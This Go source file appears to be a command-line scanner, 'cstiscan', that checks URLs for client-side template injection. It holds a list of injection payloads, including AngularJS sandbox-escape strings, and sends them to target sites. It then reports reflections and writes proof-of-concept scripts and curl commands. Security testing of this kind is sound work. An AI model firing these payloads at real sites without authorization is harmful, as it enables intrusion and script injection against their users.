package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/PuerkitoBio/goquery"
	"github.com/fatih/color"
	"github.com/schollz/progressbar/v3"
	"github.com/urfave/cli/v2"
)

type Result struct {
	URL         string   `json:"url"`
	Vulnerable  bool     `json:"vulnerable"`
	Details     []string `json:"details"`
	Proof       []string `json:"proof"`
	PoC         []string `json:"poc"`
}

var cstiPayloads = []string{
	"{{7*7}}",
	"${7*7}",
	"<%= 7*7 %>",
	"{{constructor.constructor('alert(1)')()}}",
	"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}",
	"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'alert(1)'}}",
}

func testSingleURL(url string) Result {
	result := Result{URL: url, Vulnerable: false}

	resp, err := http.Get(url)
	if err != nil {
		result.Details = append(result.Details, fmt.Sprintf("Error: %s", err))
		return result
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		result.Details = append(result.Details, fmt.Sprintf("Error: %s", err))
		return result
	}

	// Check for potential CSTI vectors
	doc.Find("script").Each(func(i int, s *goquery.Selection) {
		scriptContent := s.Text()
		re := regexp.MustCompile(`\{\{.*\}\}|\$\{.*\}|<%.*%>`)
		if re.MatchString(scriptContent) {
			result.Vulnerable = true
			result.Details = append(result.Details, "Potential CSTI vector found in script")
			result.Proof = append(result.Proof, fmt.Sprintf("Vulnerable pattern: %s", re.FindString(scriptContent)))

			pocScript := fmt.Sprintf(`
// Original script content (for reference):
/*
%s
*/

// Modified script to demonstrate vulnerability:
var div = document.createElement('div');
document.body.appendChild(div);
div.innerHTML = '{{constructor.constructor("alert('CSTI vulnerability')")()}}';
// Optionally, you can replace the above line with the vulnerable part of the original script
`, scriptContent)

			result.PoC = append(result.PoC, fmt.Sprintf("In browser console, execute the following script:\n\n%s", pocScript))
		}
	})

	// Test with payloads
	for _, payload := range cstiPayloads {
		encodedPayload := strings.ReplaceAll(strings.ReplaceAll(payload, "{{", "%7B%7B"), "}}", "%7D%7D")
		testURL := fmt.Sprintf("%s?test=%s", url, encodedPayload)
		resp, err := http.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := ioutil.ReadAll(resp.Body)
		if strings.Contains(string(body), "49") || strings.Contains(string(body), "alert(1)") {
			result.Vulnerable = true
			result.Details = append(result.Details, "Potential CSTI with payload")
			result.Proof = append(result.Proof, fmt.Sprintf("Payload reflection: %s", payload))
			result.PoC = append(result.PoC, fmt.Sprintf("curl '%s'", testURL))
		}
	}

	return result
}

func testURLs(urls []string) []Result {
	var wg sync.WaitGroup
	results := make([]Result, len(urls))
	bar := progressbar.Default(int64(len(urls)))

	for i, url := range urls {
		wg.Add(1)
		go func(i int, url string) {
			defer wg.Done()
			results[i] = testSingleURL(url)
			bar.Add(1)
		}(i, url)
	}

	wg.Wait()
	return results
}

func displayResults(results []Result, showPoC, showProof bool) []map[string]interface{} {
	outputData := []map[string]interface{}{}

	for _, result := range results {
		if result.Vulnerable {
			fmt.Printf("URL: %s\n", color.CyanString(result.URL))
			fmt.Printf("Vulnerable: %s\n", color.MagentaString("Yes"))
			fmt.Printf("Details:\n%s\n", color.GreenString(strings.Join(result.Details, "\n")))

			item := map[string]interface{}{
				"url":     result.URL,
				"details": strings.Join(result.Details, "\n"),
			}

			if showProof {
				fmt.Printf("Proof:\n%s\n", color.BlueString(strings.Join(result.Proof, "\n")))
				item["proof"] = result.Proof
			}

			if showPoC {
				fmt.Printf("PoC:\n%s\n", color.YellowString(strings.Join(result.PoC, "\n")))
				item["poc"] = result.PoC
			}

			fmt.Println(strings.Repeat("-", 80))
			outputData = append(outputData, item)
		}
	}

	return outputData
}

func saveToFile(data []map[string]interface{}, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	return encoder.Encode(data)
}

func main() {
	app := &cli.App{
		Name:  "cstiscan",
		Usage: "Scan for Client-Side Template Injection vulnerabilities",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:    "url",
				Aliases: []string{"u"},
				Usage:   "Single URL to test",
			},
			&cli.StringFlag{
				Name:    "file",
				Aliases: []string{"f"},
				Usage:   "File containing URLs to test",
			},
			&cli.BoolFlag{
				Name:  "poc",
				Usage: "Output PoC details",
			},
			&cli.BoolFlag{
				Name:  "proof",
				Usage: "Output proof of vulnerable code",
			},
		},
		Action: func(c *cli.Context) error {
			var urls []string

			if c.String("url") != "" {
				urls = append(urls, c.String("url"))
			} else if c.String("file") != "" {
				file, err := os.Open(c.String("file"))
				if err != nil {
					return err
				}
				defer file.Close()

				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					urls = append(urls, strings.TrimSpace(scanner.Text()))
				}
			} else {
				return fmt.Errorf("Please provide either a URL or a file containing URLs")
			}

			results := testURLs(urls)
			outputData := displayResults(results, c.Bool("poc"), c.Bool("proof"))

			if c.Bool("poc") || c.Bool("proof") {
				outputFilename := "csti_results.json"
				err := saveToFile(outputData, outputFilename)
				if err != nil {
					return err
				}
				fmt.Printf("Results saved to %s\n", outputFilename)
			}

			return nil
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %s\n", err)
		os.Exit(1)
	}
}
